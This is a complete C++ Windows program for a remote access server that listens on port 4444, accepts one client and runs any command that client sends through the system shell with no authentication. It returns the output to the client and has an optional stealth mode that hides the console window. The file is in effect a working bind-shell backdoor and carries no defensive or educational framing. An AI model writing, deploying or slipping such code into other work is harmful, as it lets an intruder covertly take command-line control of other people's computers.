#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <thread>
#include <vector>
#include <cstdlib>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

class RemoteAccessServer {
private:
    SOCKET serverSocket;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    struct sockaddr_in clientAddr;
    int clientAddrLen;
    bool isRunning;
    
public:
    RemoteAccessServer() : isRunning(false), clientSocket(INVALID_SOCKET) {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }
    
    ~RemoteAccessServer() {
        cleanup();
        WSACleanup();
    }
    
    bool startServer(int port) {
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET) {
            std::cerr << "Socket creation failed" << std::endl;
            return false;
        }
        
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);
        
        if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "Bind failed" << std::endl;
            return false;
        }
        
        if (listen(serverSocket, 1) == SOCKET_ERROR) {
            std::cerr << "Listen failed" << std::endl;
            return false;
        }
        
        std::cout << "Server listening on port " << port << std::endl;
        isRunning = true;
        return true;
    }
    
    bool acceptClient() {
        clientAddrLen = sizeof(clientAddr);
        clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed" << std::endl;
            return false;
        }
        
        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        std::cout << "Client connected from " << clientIP << std::endl;
        return true;
    }
    
    void handleClient() {
        char buffer[4096];
        while (isRunning) {
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived <= 0) {
                std::cout << "Client disconnected" << std::endl;
                break;
            }
            
            buffer[bytesReceived] = '\0';
            std::string command(buffer);
            
            if (command == "exit") {
                break;
            }
            
            std::string response = executeCommand(command);
            send(clientSocket, response.c_str(), response.length(), 0);
        }
    }
    
    std::string executeCommand(const std::string& command) {
        if (command.substr(0, 3) == "cd ") {
            std::string path = command.substr(3);
            if (SetCurrentDirectoryA(path.c_str())) {
                return "Directory changed to: " + path + "\n";
            } else {
                return "Failed to change directory\n";
            }
        }
        
        if (command == "pwd") {
            char currentDir[MAX_PATH];
            GetCurrentDirectoryA(MAX_PATH, currentDir);
            return std::string(currentDir) + "\n";
        }
        
        // Execute system command
        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            return "Command execution failed\n";
        }
        
        std::string result;
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        _pclose(pipe);
        
        if (result.empty()) {
            result = "Command executed successfully (no output)\n";
        }
        
        return result;
    }
    
    void cleanup() {
        isRunning = false;
        if (clientSocket != INVALID_SOCKET) {
            closesocket(clientSocket);
        }
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
    }
    
private:
    WSADATA wsaData;
};

int main() {
    // Hide console window for stealth mode
    #ifdef STEALTH_MODE
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif
    
    RemoteAccessServer server;
    
    if (!server.startServer(4444)) {
        return 1;
    }
    
    while (true) {
        if (server.acceptClient()) {
            server.handleClient();
        }
    }
    
    return 0;
}